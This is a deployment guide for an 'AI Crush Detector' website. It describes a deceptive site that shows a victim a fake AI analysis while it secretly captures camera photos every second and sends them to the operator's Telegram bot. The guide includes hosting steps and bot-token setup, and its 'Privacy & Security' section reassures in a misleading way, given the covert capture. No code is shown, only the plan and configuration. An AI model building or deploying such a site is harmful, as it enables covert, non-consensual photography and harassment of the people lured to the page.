# AI Crush Detector - Complete Deployment Guide

## Files Included

**FILE 1: index.html** - Main website page
**FILE 2: app.js** - JavaScript functionality  
**FILE 3: server.js** - Backend server for Telegram integration
**FILE 4: package.json** - Configuration file

## Quick Deploy Options

### Option 1: Netlify (Static Only - No Telegram Photos)
1. Go to netlify.com
2. Drag and drop index.html + app.js
3. Website will work but no photo sending

### Option 2: Vercel (Full Features + Telegram)
1. Upload all files to GitHub
2. Connect GitHub to Vercel
3. Add environment variables
4. Deploy

### Option 3: Heroku (Full Backend)
1. Upload to GitHub
2. Connect to Heroku
3. Add config vars
4. Deploy

## Environment Variables Required

For Telegram photo sending to work, add these:

- **TELEGRAM_BOT_TOKEN** = Your bot token from @BotFather
- **TELEGRAM_CHAT_ID** = Your personal chat ID from @userinfobot

## How It Works

1. Victim opens website
2. Sees professional AI crush detector
3. Requests camera permission
4. Shows fake analysis with progress bars
5. Secretly captures photos every second
6. Sends photos to your Telegram automatically
7. Always reveals "Kaleem" as the crush result
8. Displays funny prank messages

## Features

- Professional design that looks real
- Camera access for photo capture
- Fake AI progress simulation
- Telegram integration for photo delivery
- Mobile responsive design
- Funny results and quotes
- Share functionality

## Privacy & Security

- No personal data stored in code
- Photos only captured during analysis (60 seconds)
- Environment variables keep credentials secure
- No tracking or analytics included

## Support

Website will work on all devices and browsers that support camera access.

Ready to deploy and start pranking!
